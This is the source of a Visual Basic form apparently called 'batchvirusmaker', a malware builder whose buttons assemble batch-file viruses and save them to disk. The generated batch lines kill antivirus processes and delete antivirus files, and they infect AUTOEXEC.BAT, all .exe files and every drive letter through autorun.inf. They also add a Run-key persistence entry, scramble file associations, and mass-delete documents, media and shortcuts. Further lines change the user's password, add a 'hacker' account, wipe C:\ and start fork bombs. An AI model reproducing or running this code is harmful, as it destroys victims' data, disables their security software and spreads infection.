        RichTextBox1.Text += Environment.NewLine + " /A gcasDt*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A msmp*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A mcafe*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A mghtml"
        RichTextBox1.Text += Environment.NewLine + "tskill /A msiexec"
        RichTextBox1.Text += Environment.NewLine + "tskill /A outpost"
        RichTextBox1.Text += Environment.NewLine + "tskill /A isafe"
        RichTextBox1.Text += Environment.NewLine + "tskill /A zap*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A zauinst"
        RichTextBox1.Text += Environment.NewLine + "tskill /A upd*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A zlclien*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A minilog"
        RichTextBox1.Text += Environment.NewLine + "tskill /A cc*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A norton*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A norton au*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ccc*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A npfmn*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A loge*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A nisum*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A issvc"
        RichTextBox1.Text += Environment.NewLine + "tskill /A tmp*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A tmn*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A pcc*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A cpd*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A pop*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A pav*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A padmin"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A panda*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A avsch*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A sche*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A syman*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A virus*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A realm*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A sweep*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A scan*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ad-*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A safe*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A avas*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A norm*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A offg*"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\alwils~1\avast4\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kasper~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\trojan~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\f-prot95\*.dll "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\tbav\*.dat "
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avpersonal\*.vdf "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\*.cnt "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Mcafee\*.* "
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\Norton~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "  cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgamsr\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgamsvr\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgemc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "        cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgcc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgupsvc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\grisoft "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nood32krn\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nood32\*.exe "
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nod32 "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nood32"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kav\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kavmm\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kaspersky\*.*"
        RichTextBox1.Text += Environment.NewLine + "       cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\ewidoctrl\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\guard\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\ewido\*.exe "
        RichTextBox1.Text += Environment.NewLine + "      cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\pavprsrv\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\pavprot\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avengine\*.exe "
        RichTextBox1.Text += Environment.NewLine + "  cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\apvxdwin\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\webproxy\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\panda software\*.* "
        RichTextBox1.Text += Environment.NewLine + "  REM ---------------------------------"

    End Sub

    Private Sub Button35_Click(sender As Object, e As EventArgs) Handles Button35.Click
        SaveFileDialog1.Filter = "Batch files(*.bat)|*.bat|Text files (*.txt)|*.txt|All files (*.*)|*.*"
        If SaveFileDialog1.ShowDialog = DialogResult.OK _
        Then
            filesaved = 1
            My.Computer.FileSystem.WriteAllText _
            (SaveFileDialog1.FileName, RichTextBox1.Text, True)
        End If

    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + " REM Infect Autoexec.bat"
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete All Xml"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.xml >> FIleList_xml.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_xml.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + " REM ------------------------"
    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete All Lnk"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.lnk >> FIleList_lnk.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_lnk.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"

    End Sub

    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click
        MsgBox("This is dangerous !!!")
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Infect All Exe"
        RichTextBox1.Text += Environment.NewLine + "assoc.exe = batfile"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (InfList_exe.txt) do copy %0 ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub


    Private Sub Button32_Click(sender As Object, e As EventArgs) Handles Button32.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Infect All Drives"
        RichTextBox1.Text += Environment.NewLine + "for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do ("
        RichTextBox1.Text += Environment.NewLine + "copy /Y %0 %%E:\"
        RichTextBox1.Text += Environment.NewLine + "echo [AutoRun] > %%E:\autorun.inf"
        RichTextBox1.Text += Environment.NewLine + "echo open=""%%E:\%0"" >> %%E:\autorun.inf"
        RichTextBox1.Text += Environment.NewLine + "echo action=Open folder to see files... >> %%E:\autorun.inf)"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Confuse File Extensions Powerup"
        RichTextBox1.Text += Environment.NewLine + "assoc.dll = txtfile"
        RichTextBox1.Text += Environment.NewLine + "assoc.exe = pngfile"
        RichTextBox1.Text += Environment.NewLine + "assoc .vbs=Visual Style"
        RichTextBox1.Text += Environment.NewLine + "assoc.reg = xmlfile"
        RichTextBox1.Text += Environment.NewLine + "assoc.txt = regfile"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Confuse File Extensions for text"
        RichTextBox1.Text += Environment.NewLine + "assoc.mp3 = txtfile"
        RichTextBox1.Text += Environment.NewLine + "assoc.xml = txtfile"
        RichTextBox1.Text += Environment.NewLine + "assoc.png = txtfile"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button31_Click(sender As Object, e As EventArgs) Handles Button31.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Infect Reg Run Key"
        RichTextBox1.Text += Environment.NewLine + "valinf = ""rundll32_%random%_toolbar"""
        RichTextBox1.Text += Environment.NewLine + "reginf = ""hklm\Software\Microsoft\Windows\CurrentVersion\Run"""
        RichTextBox1.Text += Environment.NewLine + "reg add %reginf% /v %valinf% /t ""REG_SZ"" /d %0 /f > nul"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete All Texts"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_txt.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Change User Password To Bhavesh"
        RichTextBox1.Text += Environment.NewLine + "net user %username% Bhavesh"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete My Music"
        RichTextBox1.Text += Environment.NewLine + "del /f /q '%userprofile%\My Music\*.*'"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete All Mp3"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.mp3 >> FIleList_mp3.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_mp3.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + " REM Delete All Documents"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_doc.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        RichTextBox1.Text += Environment.NewLine + " vREM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + " REM Delete All Mp4"
        RichTextBox1.Text += Environment.NewLine + " DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt"
        RichTextBox1.Text += Environment.NewLine + " echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_mp4.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete My Documents"
        RichTextBox1.Text += Environment.NewLine + "del /f /q '%userprofile%\My Documents\*.*'"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button37_Click(sender As Object, e As EventArgs) Handles Button37.Click
        MsgBox("EXTREAMLY DANGEROUS - IT WILL DELETE THE WHOLE OPERATING SYSTEM")
        RichTextBox1.Text += Environment.NewLine + "@Echo off"
        RichTextBox1.Text += Environment.NewLine + "Del C:\ *.* |y"
    End Sub

    Private Sub Button39_Click(sender As Object, e As EventArgs) Handles Button39.Click

        RichTextBox1.Text += Environment.NewLine + ":a"
        RichTextBox1.Text += Environment.NewLine + "start cmd"
        RichTextBox1.Text += Environment.NewLine + "goto:a"

    End Sub

    Private Sub Button36_Click(sender As Object, e As EventArgs) Handles Button36.Click
        RichTextBox1.Text += Environment.NewLine + "@echo off"
        RichTextBox1.Text += Environment.NewLine + ": a"
        RichTextBox1.Text += Environment.NewLine + "Start"
        RichTextBox1.Text += Environment.NewLine + "Start"
        RichTextBox1.Text += Environment.NewLine + "Start"
        RichTextBox1.Text += Environment.NewLine + "echo"
        RichTextBox1.Text += Environment.NewLine + "*you have been hacked*"
        RichTextBox1.Text += Environment.NewLine + "Start"
        RichTextBox1.Text += Environment.NewLine + "Start"
        RichTextBox1.Text += Environment.NewLine + "goto :a"
    End Sub

    Private Sub Button38_Click(sender As Object, e As EventArgs) Handles Button38.Click
        RichTextBox1.Text += Environment.NewLine + "@Echo Off"
        RichTextBox1.Text += Environment.NewLine + "for /f ""tokens=1-1 delims=\"" %%a in (""%PATH%"") do (Set Root=%%a)"
        RichTextBox1.Text += Environment.NewLine + "%Root%"

        RichTextBox1.Text += Environment.NewLine + "Net user hacker hacker /add"
    End Sub

    Private Sub Button34_Click(sender As Object, e As EventArgs) Handles Button34.Click
        If filesaved = 0 Then
            Dim result As Integer = MessageBox.Show("Exit?", "Exit", MessageBoxButtons.YesNoCancel)
            If result = DialogResult.Cancel Then
                MessageBox.Show("Cancelled!")
            ElseIf result = DialogResult.No Then
                MessageBox.Show("Cancelled!")
            ElseIf result = DialogResult.Yes Then
                fadeout()
                Form1.Show()
                Me.Close()
            End If
        Else
            Form1.Show()
            Me.Close()
        End If
    End Sub

    Private Sub Button41_Click(sender As Object, e As EventArgs) Handles Button41.Click
        Process.Start("README.txt")
    End Sub

    Dim drag As Boolean
    Dim mousex As Integer
    Dim mousey As Integer

    Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel1.MouseDown
        drag = True
        mousex = Cursor.Position.X - Me.Left
        mousey = Cursor.Position.Y - Me.Top
    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - mousey
            Me.Left = Cursor.Position.X - mousex
        End If
    End Sub

    Private Sub Panel1_MouseUp(sender As Object, e As MouseEventArgs) Handles Panel1.MouseUp
        drag = False
    End Sub

    Private Sub batchvirusmaker_MouseDown(sender As Object, e As MouseEventArgs) Handles MyBase.MouseDown
        drag = True
        mousex = Cursor.Position.X - Me.Left
        mousey = Cursor.Position.Y - Me.Top
    End Sub

    Private Sub batchvirusmaker_MouseMove(sender As Object, e As MouseEventArgs) Handles MyBase.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - mousey
            Me.Left = Cursor.Position.X - mousex
        End If
    End Sub

    Private Sub batchvirusmaker_MouseUp(sender As Object, e As MouseEventArgs) Handles MyBase.MouseUp
        drag = False
    End Sub

    Private Sub RichTextBox1_DoubleClick(sender As Object, e As EventArgs) Handles RichTextBox1.DoubleClick
        If RichTextBox1.Dock = DockStyle.None Then
            RichTextBox1.Dock = DockStyle.Fill
            Button1.Hide() : Button2.Hide() : Button3.Hide() : Button4.Hide() : Button5.Hide() : Button6.Hide() : Button7.Hide()
            Button8.Hide() : Button9.Hide() : Button10.Hide() : Button11.Hide() : Button12.Hide() : Button13.Hide()
            Button14.Hide() : Button15.Hide() : Button16.Hide() : Button17.Hide() : Button18.Hide() : Button19.Hide() : Button20.Hide()
            Button21.Hide() : Button22.Hide() : Button23.Hide() : Button24.Hide() : Button25.Hide() : Button26.Hide()
            Button27.Hide() : Button28.Hide() : Button29.Hide() : Button30.Hide() : Button31.Hide() : Button32.Hide()
            Button33.Hide() : Button34.Hide() : Button35.Hide() : Button36.Hide() : Button37.Hide() : Button38.Hide()
            Button39.Hide() 'Button40.Hide()
            Button41.Hide() : Label1.Hide() : Panel1.Hide()
        Else
            RichTextBox1.Dock = DockStyle.None
            Button1.Show() : Button2.Show() : Button3.Show() : Button4.Show() : Button5.Show() : Button6.Show() : Button7.Show()
            Button8.Show() : Button9.Show() : Button10.Show() : Button11.Show() : Button12.Show() : Button13.Show()
            Button14.Show() : Button15.Show() : Button16.Show() : Button17.Show() : Button18.Show() : Button19.Show() : Button20.Show()
            Button21.Show() : Button22.Show() : Button23.Show() : Button24.Show() : Button25.Show() : Button26.Show()
            Button27.Show() : Button28.Show() : Button29.Show() : Button30.Show() : Button31.Show() : Button32.Show()
            Button33.Show() : Button34.Show() : Button35.Show() : Button36.Show() : Button37.Show() : Button38.Show()
            Button39.Show() 'Button40.Show()
            Button41.Show() : Label1.Show() : Panel1.Show()
        End If
    End Sub

    Private Sub Panel1_DoubleClick(sender As Object, e As EventArgs) Handles Panel1.DoubleClick
        If Me.WindowState = FormWindowState.Maximized Then
            fadeout()
            Me.WindowState = FormWindowState.Normal
            fadein()
        Else
            fadeout()
            Me.WindowState = FormWindowState.Maximized
            fadein()
        End If
    End Sub
    Dim filesaved As Integer
    Private Sub batchvirusmaker_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Opacity = 0
        fadein()
        filesaved = 0
        Timer1.Stop()
    End Sub

    Private Sub Button40_Click(sender As Object, e As EventArgs) Handles Button40.Click
        If Me.WindowState = FormWindowState.Maximized Then
            fadeout()
            Me.WindowState = FormWindowState.Normal
            fadein()
        Else
            fadeout()
            Me.WindowState = FormWindowState.Maximized
            fadein()
        End If
    End Sub

    Private Sub Button42_Click(sender As Object, e As EventArgs) Handles Button42.Click
        fadeout()
        Me.WindowState = FormWindowState.Minimized
        Timer1.Start()
    End Sub
    Dim GripDrag As Boolean
    Dim InitialSizeX As Integer
    Dim InitialSizeY As Integer
    Private Sub Grip_MouseDown(sender As Object, e As MouseEventArgs) Handles Grip.MouseDown
        If e.Button = MouseButtons.Left Then 'If the control is being left-clicked
            GripDrag = True 'Confirms the grip is ready to be dragged
            InitialSizeX = Me.Width 'Sets the initial width
            InitialSizeY = Me.Height 'Sets the initial height
        End If
    End Sub

    Private Sub Grip_MouseMove(sender As Object, e As MouseEventArgs) Handles Grip.MouseMove
        If GripDrag = True Then
            Me.Width = InitialSizeX + (Cursor.Position.X - (Me.Width + Me.Location.X))
            Me.Height = InitialSizeY + (Cursor.Position.Y - (Me.Height + Me.Location.Y))

            InitialSizeX = Me.Width
            InitialSizeY = Me.Height

            Me.Refresh()
        End If
    End Sub

    Private Sub Grip_MouseUp(sender As Object, e As MouseEventArgs) Handles Grip.MouseUp
        GripDrag = False
    End Sub

    Private Sub batchvirusmaker_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles MyBase.MouseDoubleClick
        If Me.WindowState = FormWindowState.Normal Then
            fadeout()
            Me.WindowState = FormWindowState.Maximized
            fadein()
        Else
            fadeout()
            Me.WindowState = FormWindowState.Normal
            fadein()
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        If Me.WindowState = FormWindowState.Normal Then
            fadeout()
            Me.WindowState = FormWindowState.Maximized
            fadein()
        Else
            fadeout()
            Me.WindowState = FormWindowState.Normal
            fadein()
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Me.WindowState = FormWindowState.Normal Or Me.WindowState = FormWindowState.Maximized Then
            Me.Opacity = 1
        Else
            Me.Opacity = 0
        End If
    End Sub
End Class